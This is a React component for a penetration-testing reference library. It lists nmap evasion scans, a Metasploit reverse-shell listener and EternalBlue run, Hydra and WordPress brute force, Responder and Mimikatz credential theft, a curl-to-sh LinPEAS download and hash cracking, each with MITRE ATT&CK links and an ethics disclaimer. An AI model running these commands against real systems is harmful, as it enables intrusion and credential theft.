import React, { useState } from 'react';
import { BookOpen, Terminal, Network, Shield, Search, Lock, ChevronRight, Copy, Check, Server, Globe, Cpu, Database, Hash, Eye, Smartphone, CloudLightning, LayoutTemplate, Zap } from 'lucide-react';

interface Command {
  cmd: string;
  desc: string;
  mitre?: string;
}

interface Category {
  id: string;
  name: string;
  icon: React.ReactNode;
  description: string;
  commands: Command[];
}

const cheatSheetData: Category[] = [
  {
    id: 'nmap',
    name: 'Advanced Nmap',
    icon: <Search size={18} />,
    description: 'Deep network mapping, evasion techniques, and custom scripting.',
    commands: [
      // Host Discovery
      { cmd: 'nmap -sn <target>', desc: 'Ping Scan: Host discovery only (no port scan).', mitre: 'T1046' },
      { cmd: 'nmap -Pn <target>', desc: 'No Ping: Treat hosts as online (bypass ICMP block).', mitre: 'T1046' },
      { cmd: 'nmap -PS22,80,443 <target>', desc: 'TCP SYN Discovery: Probe specific ports for uptime.', mitre: 'T1046' },
      
      // Scanning & Timing
      { cmd: 'nmap -sS -p- -T4 <target>', desc: 'Stealth SYN: All 65535 ports, aggressive timing.', mitre: 'T1046' },
      { cmd: 'nmap -T0 <target>', desc: 'Timing (Paranoid): Very slow to evade IDS detection.', mitre: 'T1046' },
      { cmd: 'nmap --scan-delay 500ms <target>', desc: 'Add delay between probes to remain stealthy.', mitre: 'T1046' },
      
      // OS & Service
      { cmd: 'nmap -O --osscan-guess <target>', desc: 'OS Detect: Aggressive guessing if no match found.', mitre: 'T1046' },
      { cmd: 'nmap -sV --version-intensity 9 <target>', desc: 'Version Detect: Max intensity for banners.', mitre: 'T1046' },
      
      // NSE Scripts
      { cmd: 'nmap -sC <target>', desc: 'NSE: Run default scripts (equivalent to --script=default).', mitre: 'T1046' },
      { cmd: 'nmap --script discovery <target>', desc: 'NSE: Run advanced discovery scripts.', mitre: 'T1046' },
      { cmd: 'nmap --script exploit <target>', desc: 'NSE: Attempt active exploitation (Intrusive).', mitre: 'T1210' },
      { cmd: 'nmap --script vuln <target>', desc: 'NSE: Check for specific known vulnerabilities.', mitre: 'T1595.002' },
      { cmd: 'nmap --script "vuln and safe" <target>', desc: 'NSE: Run scripts categorized as safe vulnerabilities.', mitre: 'T1595.002' },
      { cmd: 'nmap --script http-enum <target>', desc: 'NSE: Enumerate web folders and software.', mitre: 'T1083' },
      { cmd: 'nmap --script ssl-enum-ciphers <target>', desc: 'NSE: Audit SSL/TLS cipher strength.', mitre: 'T1595.002' },
      { cmd: 'nmap --script-args http.useragent="Mozilla/5.0" <target>', desc: 'NSE Arg: Spoof User-Agent string.', mitre: 'T1046' },
      
      // Evasion
      { cmd: 'nmap -f -mtu 24 <target>', desc: 'Frag: Fragment packets to MTU 24 to bypass IDS.', mitre: 'T1046' },
      { cmd: 'nmap -D RND:10 <target>', desc: 'Decoy: Mask source IP with 10 random decoys.', mitre: 'T1046' }
    ]
  },
  {
    id: 'network_analysis',
    name: 'Traffic Analysis',
    icon: <Network size={18} />,
    description: 'Wireshark filters and tcpdump for threat hunting.',
    commands: [
      { cmd: 'tcp.flags.syn==1 && tcp.flags.ack==0', desc: 'Wireshark: Display SYN packets (Scanning).', mitre: 'T1046' },
      { cmd: 'icmp.type == 8 && frame.time_delta < 0.01', desc: 'Wireshark: Detect ICMP flooding (DoS).', mitre: 'T1498' },
      { cmd: 'arp.duplicate-address-detected', desc: 'Wireshark: Detect ARP Poisoning/Spoofing.', mitre: 'T1557.002' },
      { cmd: 'http.request.uri contains "../"', desc: 'Wireshark: Detect Path Traversal attempts.', mitre: 'T1190' },
      { cmd: 'dns.qry.name.len > 50 && !dns.flags.response', desc: 'Wireshark: Long DNS queries (Tunneling).', mitre: 'T1071.004' },
      { cmd: 'http.user_agent matches "(?i)(curl|python|wget|powershell)"', desc: 'Wireshark: Suspicious non-browser User-Agents.', mitre: 'T1071.001' },
      { cmd: 'kerberos.error_code == 32', desc: 'Wireshark: Kerberos Ticket Expired (potential attack).', mitre: 'T1558' },
      { cmd: 'http.request.method=="POST" && frame contains "password"', desc: 'Wireshark: Find cleartext passwords in POST.', mitre: 'T1552.001' },
      { cmd: 'tcpdump -i eth0 -nnttt host 10.10.10.5', desc: 'Tcpdump: Timestamped capture for host.', mitre: 'T1040' },
      { cmd: 'tcpdump -A -i eth0 "tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)"', desc: 'Tcpdump: Capture only HTTP POST bodies.', mitre: 'T1040' }
    ]
  },
  {
    id: 'exploit_scan',
    name: 'Exploit & Scan',
    icon: <Zap size={18} />,
    description: 'Scanning (Nuclei/Amass) and exploitation (Metasploit/Hydra).',
    commands: [
      { cmd: 'nuclei -u <target> -t cves/ -s critical,high', desc: 'Nuclei: Scan for Critical/High CVEs.', mitre: 'T1595.002' },
      { cmd: 'nuclei -l urls.txt -t misconfiguration/ -rl 50', desc: 'Nuclei: Scan list for misconfigs (Rate Limit 50).', mitre: 'T1595.002' },
      { cmd: 'nuclei -u <target> -t exposures/tokens/', desc: 'Nuclei: Scan for exposed API keys/tokens.', mitre: 'T1552' },
      { cmd: 'hydra -l user -P pass.txt ssh://<target>', desc: 'Hydra: Parallel login cracker for SSH/FTP/Web.', mitre: 'T1110' },
      { cmd: 'commix --url="<url>?p=1" --batch', desc: 'Commix: Automated OS command injection tester.', mitre: 'T1059' },
      { cmd: 'evil-winrm -i <ip> -u <user> -p <pass>', desc: 'Evil-WinRM: Shell access on Windows via WinRM.', mitre: 'T1021.006' },
      { cmd: 'responder -I eth0 -wrf', desc: 'Responder: LLMNR/NBT-NS poisoner & credential harvester.', mitre: 'T1557.001' },
      { cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST <ip>; run"', desc: 'Metasploit: Quick reverse shell listener.', mitre: 'T1059' },
      { cmd: 'msfconsole -x "use auxiliary/scanner/http/title; set RHOSTS <target>; run"', desc: 'Metasploit: HTTP Title Scanner (Recon).', mitre: 'T1595' },
      { cmd: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set LHOST <ip>; run"', desc: 'Metasploit: EternalBlue Exploit Example.', mitre: 'T1210' },
      { cmd: 'search type:exploit platform:linux apache', desc: 'Metasploit: Search for specific exploits.', mitre: 'T1595' },
      { cmd: 'use auxiliary/scanner/smb/smb_version', desc: 'Metasploit: Use auxiliary scanner module.', mitre: 'T1046' },
      { cmd: 'sessions -u <id>', desc: 'Metasploit: Upgrade shell to Meterpreter.', mitre: 'T1059' }
    ]
  },
  {
    id: 'exploit_db',
    name: 'Exploit Database',
    icon: <Database size={18} />,
    description: 'Search and retrieval of exploits from Exploit-DB archive.',
    commands: [
      { cmd: 'searchsploit "Apache 2.4" "Linux"', desc: 'Search for exploits by software and platform.', mitre: 'T1596' },
      { cmd: 'searchsploit --cve 2021-44228', desc: 'Search for exploits by CVE ID.', mitre: 'T1596' },
      { cmd: 'searchsploit -m 12345', desc: 'Mirror (copy) exploit code to current directory.', mitre: 'T1588.001' },
      { cmd: 'searchsploit -p 12345', desc: 'Show full path and inspect exploit metadata.', mitre: 'T1588.002' },
      { cmd: 'searchsploit --nmap file.xml', desc: 'Search for exploits based on Nmap XML output.', mitre: 'T1595' }
    ]
  },
  {
    id: 'web',
    name: 'Web App Security',
    icon: <Globe size={18} />,
    description: 'OWASP Top 10 testing: SQLi, XSS, SSRF, and Recon.',
    commands: [
      { cmd: 'amass enum -d <domain> -active', desc: 'Amass: Active subdomain enumeration and mapping.', mitre: 'T1590' },
      { cmd: 'subfinder -d <domain> -silent', desc: 'Subfinder: Passive subdomain enumeration source.', mitre: 'T1590' },
      { cmd: 'gobuster dir -u <url> -w list.txt -t 50', desc: 'Gobuster: Directory and file brute-forcing.', mitre: 'T1595' },
      { cmd: 'whatweb -a 3 <url>', desc: 'Aggressive technology stack identification.', mitre: 'T1592' },
      { cmd: 'ffuf -w common.txt -u <url>/FUZZ -fs 0', desc: 'Directory fuzzing (filter size 0).', mitre: 'T1595.002' },
      { cmd: 'nikto -h <url> -Tuning 1,3,7', desc: 'Scan for file upload (1), info disclosure (3), misc (7).', mitre: 'T1595.002' },
      { cmd: 'sqlmap -u "<url>" --batch --level=5 --risk=3', desc: 'Max intensity SQL injection scan.', mitre: 'T1190' },
      { cmd: 'python3 xsstrike.py -u "<url>" --crawl', desc: 'Advanced XSS detection and fuzzing.', mitre: 'T1059.007' },
      { cmd: 'curl http://169.254.169.254/latest/meta-data/', desc: 'Test for Cloud SSRF (AWS Metadata).', mitre: 'T1552' },
      { cmd: 'searchsploit "Apache Struts 2.5"', desc: 'Search for known exploits in components.', mitre: 'T1190' },
      { cmd: 'cutycapt --url=<url> --out=report.png', desc: 'Capture screenshot for evidence/reporting.', mitre: 'N/A' },
      { cmd: 'nmap --script=http-security-headers <target>', desc: 'Check for missing security headers.', mitre: 'T1595.002' }
    ]
  },
  {
    id: 'api_sec',
    name: 'API Security',
    icon: <CloudLightning size={18} />,
    description: 'REST/GraphQL endpoint discovery and testing.',
    commands: [
      { cmd: 'kiterunner scan <target> -w routes.txt', desc: 'High-speed API endpoint discovery.', mitre: 'T1595' },
      { cmd: 'arjun -u <url> --get', desc: 'Fuzz and discover hidden URL parameters.', mitre: 'T1595' },
      { cmd: 'jwt_tool.py <token> -T', desc: 'Test JWTs for none-algo, tampering, and secrets.', mitre: 'T1552' },
      { cmd: 'ffuf -w words.txt -u <url> -H "Content-Type: application/json" -d \'{"key": "FUZZ"}\'', desc: 'Fuzz JSON POST body keys/values.', mitre: 'T1190' },
      { cmd: 'curl -X POST -H "Content-Type: application/json" --data \'{"query":"{__schema{types{name,fields{name}}}}"}\' <url>', desc: 'GraphQL Introspection: Dump schema structure.', mitre: 'T1595' },
      { cmd: 'zap-api-scan.py -t <swagger_url> -f openapi', desc: 'OWASP ZAP: Automated scan against OpenAPI/Swagger definition.', mitre: 'T1595.002' }
    ]
  },
  {
    id: 'cms_sec',
    name: 'CMS Scanning',
    icon: <LayoutTemplate size={18} />,
    description: 'Specialized scanners for WordPress, Drupal, Joomla.',
    commands: [
      { cmd: 'wpscan --url <url> --enumerate p,t,u', desc: 'Enumerate WP plugins, themes, and users.', mitre: 'T1595.002' },
      { cmd: 'droopescan scan drupal -u <url>', desc: 'Identify Drupal version and vulnerabilities.', mitre: 'T1595.002' },
      { cmd: 'joomscan -u <url>', desc: 'Scan Joomla sites for known flaws.', mitre: 'T1595.002' },
      { cmd: 'wpscan --url <url> --passwords rockyou.txt --usernames admin', desc: 'Brute force WordPress login.', mitre: 'T1110' }
    ]
  },
  {
    id: 'mobile_sec',
    name: 'Mobile Security',
    icon: <Smartphone size={18} />,
    description: 'Android/iOS assessment with ADB, Frida, and Objection.',
    commands: [
      { cmd: 'apktool d app.apk -o output_dir', desc: 'Decompile APK to view resources and smali.', mitre: 'T1418' },
      { cmd: 'jadx-gui app.apk', desc: 'Decompile APK to Java source code (GUI).', mitre: 'T1418' },
      { cmd: 'adb shell pm list packages -f', desc: 'List installed packages and their paths.', mitre: 'T1418' },
      { cmd: 'adb logcat | grep -i "token"', desc: 'Monitor logs for leaked sensitive data.', mitre: 'T1409' },
      { cmd: 'objection --gadget "com.app" explore', desc: 'Runtime exploration and SSL unpinning.', mitre: 'T1418' },
      { cmd: 'frida -U -f com.app -l bypass_root.js', desc: 'Hook app to bypass root detection.', mitre: 'T1554' }
    ]
  },
  {
    id: 'linux_enum',
    name: 'Linux Enumeration',
    icon: <Terminal size={18} />,
    description: 'System reconnaissance for privilege escalation and auditing.',
    commands: [
      { cmd: 'uname -a; lsb_release -a', desc: 'Kernel and distribution information.', mitre: 'T1082' },
      { cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Find binaries with SUID bit set.', mitre: 'T1548.001' },
      { cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', desc: 'LinPEAS: Automated privilege escalation enumeration.', mitre: 'T1082' },
      { cmd: 'sudo -l', desc: 'List commands the current user can run as root.', mitre: 'T1082' },
      { cmd: 'netstat -antup', desc: 'List all active connections.', mitre: 'T1049' },
      { cmd: 'history | grep -i "pass"', desc: 'Search command history for passwords.', mitre: 'T1552.003' }
    ]
  },
  {
    id: 'windows_ad',
    name: 'Active Directory / PS',
    icon: <Server size={18} />,
    description: 'PowerShell and CLI commands for Windows domain auditing.',
    commands: [
      { cmd: 'net user /domain', desc: 'List all users in the current domain.' },
      { cmd: 'Get-ADUser -Filter * -Properties *', desc: 'Dump all AD user object properties.', mitre: 'T1087' },
      { cmd: 'Invoke-Mimikatz -DumpCreds', desc: 'Dump credentials from memory (Lab Use Only).', mitre: 'T1003' },
      { cmd: 'impacket-psexec <domain>/<user>:<pass>@<target>', desc: 'Impacket: Remote execution via SMB (PsExec).', mitre: 'T1021.002' },
      { cmd: 'bloodhound-python -d <domain> -u <user> -p <pass> -c All', desc: 'BloodHound: Ingest domain relationships for analysis.', mitre: 'T1087' },
      { cmd: 'wmic qfe get Caption,HotFixID', desc: 'List installed patches/hotfixes.', mitre: 'T1082' }
    ]
  },
  {
    id: 'crypto_hash',
    name: 'Crypto & Hashing',
    icon: <Hash size={18} />,
    description: 'Encryption, decoding, and integrity verification.',
    commands: [
      { cmd: 'hashcat -m 0 -a 0 hashes.txt words.txt', desc: 'Hashcat: GPU-accelerated hash cracking (MD5).', mitre: 'T1110' },
      { cmd: 'echo -n "text" | md5sum', desc: 'Generate MD5 hash.' },
      { cmd: 'echo "base64" | base64 -d', desc: 'Decode Base64 string.' },
      { cmd: 'john --wordlist=rockyou.txt hashes.txt', desc: 'Crack hashes using John the Ripper.', mitre: 'T1110' },
      { cmd: 'openssl s_client -connect host:443', desc: 'Inspect SSL/TLS certificate chain.', mitre: 'T1595' }
    ]
  }
];

const CheatSheetView: React.FC = () => {
  const [activeCategory, setActiveCategory] = useState<string>(cheatSheetData[0].id);
  const [copiedIndex, setCopiedIndex] = useState<string | null>(null);

  const activeData = cheatSheetData.find(c => c.id === activeCategory);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(id);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  return (
    <div className="h-full flex flex-col md:flex-row p-6 max-w-7xl mx-auto w-full gap-6 overflow-hidden">
      
      {/* Sidebar / Category List */}
      <div className="w-full md:w-64 flex flex-col gap-2 flex-shrink-0 bg-slate-900/50 rounded-xl p-2 border border-slate-800 h-full overflow-y-auto">
        <div className="p-2 mb-2">
          <h1 className="text-2xl font-bold text-emerald-400 flex items-center gap-3">
            <BookOpen className="w-8 h-8" />
            Library
          </h1>
          <p className="text-slate-400 text-sm mt-1">Master Reference</p>
        </div>
        
        <div className="flex flex-col gap-1">
          {cheatSheetData.map(cat => (
            <button
              key={cat.id}
              onClick={() => setActiveCategory(cat.id)}
              className={`flex items-center gap-3 p-3 rounded-lg transition-all text-sm font-medium whitespace-nowrap text-left ${
                activeCategory === cat.id
                  ? 'bg-emerald-900/30 text-emerald-400 border border-emerald-800/50 shadow-md'
                  : 'text-slate-400 hover:bg-slate-800 hover:text-slate-200 border border-transparent'
              }`}
            >
              <span className={activeCategory === cat.id ? 'text-emerald-400' : 'text-slate-500'}>
                {cat.icon}
              </span>
              <span className="flex-1">{cat.name}</span>
              {activeCategory === cat.id && <ChevronRight size={14} className="ml-auto opacity-70" />}
            </button>
          ))}
        </div>
        
        <div className="mt-auto pt-4 px-2">
           <div className="text-[10px] text-slate-600 uppercase tracking-wider font-semibold text-center border-t border-slate-800 pt-2">
             Educational Use Only
           </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 bg-slate-900 border border-slate-800 rounded-xl shadow-lg flex flex-col overflow-hidden">
        {activeData && (
          <>
            <div className="p-6 border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
              <div className="flex items-center gap-3 mb-2">
                <div className="p-2 bg-emerald-900/20 rounded-lg text-emerald-400 border border-emerald-900/30">
                  {activeData.icon}
                </div>
                <h2 className="text-xl font-bold text-slate-100">{activeData.name}</h2>
              </div>
              <p className="text-slate-400 text-sm">{activeData.description}</p>
            </div>

            <div className="overflow-y-auto p-6 space-y-4">
              {activeData.commands.map((item, idx) => {
                const uniqueId = `${activeCategory}-${idx}`;
                return (
                  <div key={idx} className="group bg-slate-950/50 border border-slate-800 rounded-lg p-4 hover:border-emerald-500/30 transition-all shadow-sm hover:shadow-md">
                    <div className="flex justify-between items-start gap-4">
                      <div className="flex-1 font-mono text-sm text-cyan-300 break-all leading-relaxed">
                        <span className="select-all">{item.cmd}</span>
                      </div>
                      <button
                        onClick={() => handleCopy(item.cmd, uniqueId)}
                        className={`transition-all p-2 rounded-md ${copiedIndex === uniqueId ? 'bg-emerald-900/50 text-emerald-400' : 'text-slate-500 hover:text-emerald-400 hover:bg-slate-900'}`}
                        title="Copy command"
                      >
                        {copiedIndex === uniqueId ? <Check size={16} /> : <Copy size={16} />}
                      </button>
                    </div>
                    <div className="mt-3 text-xs text-slate-400 border-t border-slate-800/50 pt-2 flex items-start gap-2">
                      <Shield size={12} className="text-emerald-600 mt-0.5 flex-shrink-0" />
                      <span className="flex-1">{item.desc}</span>
                      {item.mitre && (
                         <a 
                           href={`https://attack.mitre.org/techniques/${item.mitre.replace('.','/')}`} 
                           target="_blank" 
                           rel="noopener noreferrer"
                           className="flex-shrink-0 bg-slate-900 text-slate-500 hover:text-emerald-400 px-1.5 py-0.5 rounded border border-slate-800 font-mono text-[10px] transition-colors"
                           title="View MITRE ATT&CK Technique"
                         >
                           {item.mitre}
                         </a>
                      )}
                    </div>
                  </div>
                );
              })}
              
              <div className="mt-8 p-4 bg-slate-950 border border-red-900/30 rounded-lg flex gap-3 shadow-inner">
                <Shield className="text-red-400/80 flex-shrink-0" size={20} />
                <div className="text-xs text-slate-400 leading-relaxed">
                  <strong className="text-red-400 block mb-1">ETHICAL DISCLAIMER</strong>
                  These commands are provided strictly for educational purposes and authorized security testing. 
                  Deploying these tools against systems without explicit permission is illegal and unethical. 
                  Always practice in a controlled lab environment (e.g., local VMs, Hack The Box, TryHackMe).
                </div>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default CheatSheetView;